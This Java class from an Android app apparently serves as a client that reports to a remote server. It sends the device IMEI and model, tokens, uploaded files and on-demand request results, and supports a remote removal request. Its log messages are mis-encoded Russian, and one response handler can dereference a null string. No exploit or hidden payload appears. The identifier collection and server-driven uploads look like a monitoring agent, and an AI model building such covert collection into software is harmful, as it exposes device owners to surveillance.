package com.inet.android.request;

import org.apache.http.Header;
import org.json.JSONException;
import org.json.JSONObject;

import android.content.Context;
import android.content.SharedPreferences;
import android.preference.PreferenceManager;

import com.inet.android.bs.NetworkChangeReceiver;
import com.inet.android.db.OperationWithRecordInDataBase;
import com.inet.android.info.DeviceInformation;
import com.inet.android.request.FileCaller.RequestListener;
import com.inet.android.utils.ConvertDate;
import com.inet.android.utils.GeneratorLine;
import com.inet.android.utils.Logging;
import com.inet.android.utils.ValueWork;
import com.loopj.android.http.RequestParams;

public class RequestList {
	final private static String LOG_TAG = RequestList.class.getSimpleName()
			.toString();

	/**
	 * Sending a request for a first token
	 */
	public static void sendRequestForFirstToken(Context mContext) {
		SharedPreferences sp = PreferenceManager
				.getDefaultSharedPreferences(mContext);

		Logging.doLog(
				LOG_TAG,
				"send sendRequestForFirstToken, account: "
						+ sp.getString("account", "account"));

		TokenRequest tr = new TokenRequest(mContext);
		tr.sendRequest(ConstantValue.TYPE_FIRST_TOKEN_REQUEST);
	}

	/**
	 * Sending start request
	 */
	public static void sendStartRequest(Context mContext) {
		SharedPreferences sp = PreferenceManager
				.getDefaultSharedPreferences(mContext);

		Logging.doLog(
				LOG_TAG,
				"send start request, account: "
						+ sp.getString("account", "account"));

		JSONObject jsonObject = new JSONObject();
		try {
			jsonObject.put("account", sp.getString("account", "0000"));
			jsonObject.put("imei", sp.getString("imei", "imei"));
			jsonObject.put("model", sp.getString("model", "0000"));
		} catch (JSONException e) {
			e.printStackTrace();
		}

		String str = jsonObject.toString();
		StartRequest sr = new StartRequest(mContext);
		sr.sendRequest(str);
	}

	/**
	 * Sending a status request
	 */
	public static void sendCheckRequest(Context mContext) {
		Logging.doLog(LOG_TAG, "send CheckRequest", "send CheckRequest");

		SharedPreferences sp = PreferenceManager
				.getDefaultSharedPreferences(mContext);

		JSONObject jsonObject = new JSONObject();
		try {
			jsonObject.put("account", sp.getString("account", "0000"));
			jsonObject.put("device", sp.getString("device", "0000"));
		} catch (JSONException e) {
			Logging.doLog(LOG_TAG, "÷òî-òî íå òàê ñ json",
					"÷òî-òî íå òàê ñ json");
			e.printStackTrace();
		}

		String str = jsonObject.toString();

		CheckRequest cr = new CheckRequest(mContext);
		cr.sendRequest(str);

	}

	/**
	 * Sending a token APP device
	 */
	public static void sendTokenAppRequest(Context mContext) {
		Logging.doLog(LOG_TAG, "requestTask start", "requestTask start");

		SharedPreferences sp = PreferenceManager
				.getDefaultSharedPreferences(mContext);

		JSONObject jsonObject = new JSONObject();
		try {

			jsonObject.put("device", sp.getString("device", "0000"));
			jsonObject.put("account", sp.getString("account", "0000"));
			jsonObject.put("token", sp.getString("time_setub", ""));
			jsonObject.put("key_for_bug", GeneratorLine.createRandomString(mContext));
			

		} catch (JSONException e) {
			Logging.doLog(LOG_TAG, "÷òî-òî íå òàê ñ json",
					"÷òî-òî íå òàê ñ json");
			e.printStackTrace();
		}
		String str = jsonObject.toString();
		AppTokenRequest ar = new AppTokenRequest(mContext);
		ar.sendRequest(str);

	}

	/**
	 * Sending a request for a second token
	 */
	public static void sendRequestForSecondToken(Context mContext) {
		SharedPreferences sp = PreferenceManager
				.getDefaultSharedPreferences(mContext);

		Logging.doLog(
				LOG_TAG,
				"send sendRequestForSecondToken, account: "
						+ sp.getString("account", "account"));
		TokenRequest tr = new TokenRequest(mContext);
		tr.sendRequest(ConstantValue.TYPE_SECOND_TOKEN_REQUEST);
	}

	/**
	 * Sending periodic query
	 */
	public static void sendPeriodicRequest(Context mContext) {
		Logging.doLog(LOG_TAG, "sendPeriodicRequest", "sendPeriodicRequest");
		PeriodicRequest pr = new PeriodicRequest(mContext);
		pr.sendRequest(null);

	}

	/**
	 * Sending data request
	 */
	public static void sendDataRequest(String req, Context mContext) {

		Logging.doLog(LOG_TAG, "send data request", "send data request: ");
		DataRequest dataReq = new DataRequest(mContext);
		dataReq.sendRequest(req);
	}

	/**
	 * Sending service data request
	 */
	public static void sendDataRequest(String area, String event,
			Context mContext) {
		String sendJSONStr = null;

		try {

			JSONObject info = new JSONObject();
			JSONObject object = new JSONObject();
			info.put("area", area);
			info.put("event", event);

			object.put("time", ConvertDate.logTime());
			object.put("type", "12");
			object.put("info", info);
			sendJSONStr = object.toString();
		} catch (JSONException e) {
			Logging.doLog(LOG_TAG, "json ñëîìàëñÿ", "json ñëîìàëñÿ");
		}
		Logging.doLog(LOG_TAG, "send data request: 12", "send data request: 12");
		DataRequest dataReq = new DataRequest(mContext);
		dataReq.sendRequest(sendJSONStr);
	}

	/**
	 * Sending service data request
	 */
	public static void sendFileRequest(final RequestParams params,
			final Context mContext) {

		if (ValueWork.getMethod(ConstantValue.TYPE_DISPATCH, mContext) == 1) {
			Logging.doLog(LOG_TAG, "TYPE_DISPATCH", "TYPE_DISPATCH");
			if (NetworkChangeReceiver.isOnline(mContext) != 2) {
				Logging.doLog(LOG_TAG, "isOnline != 2", "isOnline != 2");
				OperationWithRecordInDataBase.insertRecord(params.toString(),
						ConstantValue.TYPE_FILE_REQUEST, mContext);
				return;
			}
		}
		FileCaller handler = FileCaller.getInstance();
		handler.sendRequest(params, mContext, new RequestListener() {
			@Override
			public void onSuccess(int arg0, Header[] arg1, JSONObject timeline) {
				// do whatever you want here.
				Logging.doLog(LOG_TAG, "onSuccess. StatusCode: " + arg0 + " "
						+ timeline, "onSuccess. StatusCode" + arg0 + " "
						+ timeline);
				String str = "";
				try {
					str = timeline.getString("code");
				} catch (JSONException e) {
					str = null;
				}
				if (str.equals("2")) {
					RequestList.sendPeriodicRequest(mContext);
				} else if (str.equals("0")) {
					OperationWithRecordInDataBase.insertRecord(
							params.toString(), ConstantValue.TYPE_FILE_REQUEST,
							mContext);
					DisassemblyErrors.setError(str, mContext);
				}

			}

			@Override
			public void onFailure(int statusCode, Throwable throwable) {
				// TODO Auto-generated method stub
				Logging.doLog(LOG_TAG, "onFailru. StatusCode" + statusCode,
						"onFailru. StatusCode" + statusCode);
				DisassemblyErrors.setError(statusCode,
						ConstantValue.TYPE_SECOND_TOKEN_REQUEST, mContext);
				OperationWithRecordInDataBase.insertRecord(params.toString(),
						ConstantValue.TYPE_FILE_REQUEST, mContext);

			}

		});

	}

	/**
	 * Sending demand request
	 */
	public static void sendDemandRequest(String request, int infoType,
			String complete, int version, Context mContext) {
		OnDemandRequest dr = new OnDemandRequest(infoType, complete, version,
				mContext);
		dr.sendRequest(request);
	}

	/**
	 * Sending demand request
	 */
	public static void sendInfoDeviceRequest(Context mContext) {
		DeviceInformation device = new DeviceInformation(mContext);
		device.getInfo();
	}

	/**
	 * Send a request for removal
	 */
	public static void sendDelRequest(Context mContext) {
		Logging.doLog(LOG_TAG, "sendDelRequest start", "sendDelRequest start");

		SharedPreferences sp = PreferenceManager
				.getDefaultSharedPreferences(mContext);

		JSONObject jsonObject = new JSONObject();
		try {
			jsonObject.put("device", sp.getString("device", "0000"));
			jsonObject.put("account", sp.getString("account", "0000"));
			jsonObject.put("key", sp.getString("key_removal", "-1"));
			jsonObject.put("mode", "1");
		} catch (JSONException e) {
			Logging.doLog(LOG_TAG, "÷òî-òî íå òàê ñ json",
					"÷òî-òî íå òàê ñ json");
			e.printStackTrace();
		}

		String str = jsonObject.toString();
		DelRequest dr = new DelRequest(mContext);
		dr.sendRequest(str);
	}
}